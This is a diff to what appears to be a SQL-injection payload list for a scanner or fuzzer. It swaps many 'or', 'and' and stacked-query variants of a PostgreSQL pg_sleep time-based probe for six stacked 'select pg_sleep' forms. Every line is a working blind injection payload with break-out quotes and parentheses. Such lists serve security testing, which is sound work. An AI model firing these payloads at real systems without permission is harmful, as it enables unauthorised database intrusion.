@@ -1,28 +1,6 @@
-[space]pg_sleep(__TIME__)--
-[space]or pg_sleep(__TIME__)--
-" or pg_sleep(__TIME__)--
-' or pg_sleep(__TIME__)--
-) or pg_sleep(__TIME__)--
-") or pg_sleep(__TIME__)--
-') or pg_sleep(__TIME__)--
-)) or pg_sleep(__TIME__)--
-")) or pg_sleep(__TIME__)--
-')) or pg_sleep(__TIME__)--
-[space]and pg_sleep(__TIME__)--
-" and pg_sleep(__TIME__)--
-' and pg_sleep(__TIME__)--
-) and pg_sleep(__TIME__)--
-") and pg_sleep(__TIME__)--
-') and pg_sleep(__TIME__)--
-)) and pg_sleep(__TIME__)--
-")) and pg_sleep(__TIME__)--
-')) and pg_sleep(__TIME__)--
-; SELECT pg_sleep(__TIME__)--
-" ; SELECT pg_sleep(__TIME__)--
-' ; SELECT pg_sleep(__TIME__)--
-) ; SELECT pg_sleep(__TIME__)--
-") ; SELECT pg_sleep(__TIME__)--
-') ; SELECT pg_sleep(__TIME__)--
-)) ; SELECT pg_sleep(__TIME__)--
-")) ; SELECT pg_sleep(__TIME__)--
-')) ; SELECT pg_sleep(__TIME__)--
+;select pg_sleep(__TIME__); --[space]
+';select pg_sleep(__TIME__); --[space]
+);select pg_sleep(__TIME__); --[space]
+');select pg_sleep(__TIME__); --[space]
+));select pg_sleep(__TIME__); --[space]
+'));select pg_sleep(__TIME__); --[space]
